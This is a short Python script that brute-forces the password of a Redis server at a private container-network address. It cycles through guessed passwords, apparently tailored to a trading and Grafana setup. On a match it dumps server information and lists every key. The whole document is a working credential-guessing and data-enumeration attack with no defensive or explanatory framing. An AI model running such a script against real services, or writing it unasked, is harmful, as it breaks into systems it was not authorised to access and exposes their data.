import socket

passwords = [
    "Passwd2024!", "Passwd2024", "passwd2024!", 
    "Redis2024!", "redis2024!", "RedisPasswd2024!",
    "Grafana2024!", "grafana2024!", 
    "Admin2024!", "admin2024!",
    "Quant2024!", "quant2024!",
    "Password2024!", "password2024!",
    "Kline2024!", "Trading2024!",
    "Passwd2024!@#", "P@sswd2024!",
    "admin123", "Passwd2024"
]

for pw in passwords:
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect(("172.18.0.1", 6379))
        s.send(f"AUTH {pw}\r\n".encode())
        r = s.recv(100).decode()
        if "+OK" in r:
            print(f"REDIS PASSWORD: {pw}")
            s.send(b"INFO server\r\n")
            info = s.recv(4000).decode()
            print(info[:500])
            s.send(b"KEYS *\r\n")
            keys = s.recv(4000).decode()
            print(f"\nKEYS:\n{keys[:500]}")
            break
        s.close()
    except:
        pass
else:
    print("NO MATCH")
